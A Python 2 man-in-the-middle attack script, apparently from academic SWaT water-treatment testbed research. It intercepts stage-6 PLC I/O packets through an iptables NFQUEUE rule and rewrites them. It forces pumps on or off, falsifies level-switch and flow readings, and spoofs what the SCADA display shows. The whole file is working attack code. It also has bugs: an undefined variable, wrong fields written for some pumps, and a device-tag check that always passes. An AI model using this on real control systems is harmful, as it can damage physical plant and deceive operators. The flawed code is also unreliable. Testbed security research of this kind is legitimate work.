#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2019  Beebi Siti Salimah Binte Liyakkathali, liyakkathali@sutd.edu.sg
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

#Last modified on: 07 May 2019

# Script part of A6_L0 Mitm tool: https://github.com/ibmilo/A6-L0-MITM
# Some attributes to 	https://github.com/ifyouaretea/A6-MITM
#			https://github.com/scy-phy/swat


import ctypes
from time import sleep
from time import time as ts
import signal
import os
import sys
from netfilterqueue import NetfilterQueue
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from _PLC6 import SWAT_P6_RIO_DO, SWAT_P6_RIO_DI, SWAT_P6_RIO_AI

from scaling_all import P1Flow, P1Level, P2Flow, P2Cond, P2Ph, P2Orp, P3Level, P3Flow, P3DPress, \
                    P4Level, P4Hrdss, P4Flow, P4Orp, \
                    P5FeedPh, P5FeedOrp, P5FeedCond, P5PremCond, P5FeedFlow, P5PermFlow,\
                    P5ConcFlow, P5RecFlow, P5HPumpPress, P5PermPress, P5ConcPress,\
                    P6BackFlow, current_to_signal, signal_to_current



global toggle_flag
global current_spoofed


device_type = []
device_tag = []
value = []
scada = []




class attack_P6_level0:

    toggle_flag = False


    def __init__(self):
        self.toggle_flag = False


    def start(self):
        self.nfqueue = NetfilterQueue()
        os.system('sudo iptables -t mangle -A PREROUTING -s 192.168.0.62,192.168.0.60 -p udp --dport 2222 -j NFQUEUE --queue-num 2')
        self.nfqueue.bind(2, self._launch_P6_attack)
        self.nfqueue.run()
        print('***********************inject start******************************')


    def stop(self):
        os.system('sudo iptables -t mangle -F')
        self.nfqueue.unbind()
        print('*** STOPPING IPTABLES ***')


    def _launch_P6_attack(self,packet):

        global device_tag
        global value 
        global scada

        length = len(device_tag)
        ind = 0
        pkt = IP(packet.get_payload())
        
       

        while ind < length:

            dev = device_tag[ind]
            val = value[ind]
          
            if SWAT_P6_RIO_DI in pkt:
              pkt.show()
              if dev == "P601":
                pkt[SWAT_P6_RIO_DI].P601_Run = sca

              elif dev == "P602":
                pkt[SWAT_P6_RIO_DI].P601_Run = sca

              elif dev == "P603":
                pkt[SWAT_P6_RIO_DI].P602_Run = sca

              else:

                if sca == 0 :
                  if dev == "LS601": 
                    print "-----"
                    pkt[SWAT_P6_RIO_DI].LS601_High = 0
                    pkt[SWAT_P6_RIO_DI].LS601_Low = 1

                  elif dev == "LS602": 
                    pkt[SWAT_P6_RIO_DI].LS602_High = 0
                    pkt[SWAT_P6_RIO_DI].LS602_Low = 1
                    
                  else : #dev == "LS603": 
                    pkt[SWAT_P6_RIO_DI].LS603_High = 0
                    pkt[SWAT_P6_RIO_DI].LS603_Low = 1

                else :# sca == 1 :
                  if dev == "LS601": 
                    pkt[SWAT_P6_RIO_DI].LS601_High = 1
                    pkt[SWAT_P6_RIO_DI].LS601_Low = 0

                  elif dev == "LS602": 

                    pkt[SWAT_P6_RIO_DI].LS602_High = 1
                    pkt[SWAT_P6_RIO_DI].LS602_Low = 0

                  else : #dev == "LS603": 

                    pkt[SWAT_P6_RIO_DI].LS603_High = 1
                    pkt[SWAT_P6_RIO_DI].LS603_Low = 0


                   



            if SWAT_P6_RIO_DO in pkt:

              if dev  == "P601":
                  pkt[SWAT_P6_RIO_DO].P601_Start = val
              
              elif dev  == "P602":
                  pkt[SWAT_P6_RIO_DO].P602_Start = val
              
              else: # dev  == "P603":
                  pkt[SWAT_P6_RIO_DO].P603_Start = val
    

            if SWAT_P6_RIO_AI in pkt:

              if dev == "FIT601":

                self.true_measurement_P6_Flow = current_to_signal(pkt[SWAT_P6_RIO_AI].FIT601_Flow, P6BackFlow)  #scaling

                if(self.toggle_flag == False):
                  spoofed_measurement = self.true_measurement_P6_Flow
                  self.toggle_flag = True

                if(self.toggle_flag):
                  spoofed_measurement = mutate_valve
                  current_spoofed = signal_to_current(spoofed_measurement, P6BackFlow) 
                  pkt[SWAT_P6_RIO_AI].FIT601_Flow =  current_spoofed

                  print('FIT501 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P6_Flow,spoofed_measurement))

            ind = ind +1
            del pkt[UDP].chksum  # Need to recompute checksum
           # pkt.show()
            packet.set_payload(str(pkt))

        packet.accept()


def start():

  attacker = attack_P6_level0();
  def signal_term_handler(signal, frame):
    print('*** STOPPING')
    attacker.stop()

  signal.signal(signal.SIGTERM, signal_term_handler)
  try:
    print('attacker is loaded')
    attacker.start()
    signal.pause()  # wait for a signal
  except KeyboardInterrupt:
    print('*** STOPPING')
    attacker.stop()

if __name__=='__main__':
  
    num_of_attacks = int(raw_input('Enter number of actuators attacks : '))


    for i in range (num_of_attacks) :
        print ("For Point %i >>>") % (i + 1)

        dev_type = raw_input('Enter device type to attack (e.g PUMP, SWITCH) : ')
        dev_tag = raw_input('Enter tag  to attack (e.g P601, LS601) : ')

        if dev_type == "PUMP" or dev_type == "LED":
           val =  int (raw_input('Enter value - ON (1) or OFF (0) : '))
           sca =  int (raw_input('Set SCADA display to - ON (1) or OFF (0) : '))

        elif dev_type == "SWITCH":
           val = 0
           sca = raw_input('Enter value - HIGH (1) or LOW (0): ')


        elif dev_type == "FIT":
            dev_tag = raw_input('Enter tag  to attack (e.g P601, LS601) : ')
            val =  int (raw_input('Enter value to spoofed value : '))

        else:
            print "Device type not found"
            sys.exit()




        if dev_tag == "P601" or dev_tag == "P602" or dev_tag == "P603" or dev_tag == "FIT601"\
        or dev_tag == "LS601" or dev_tag == "LS602" or "LS603":

       
          device_type.append(dev_type)
          device_tag.append(dev_tag)
          value.append(val)
          scada.append(sca)
        else:
          print "Device tag not found"
          sys.exit()

    sys.exit(start())











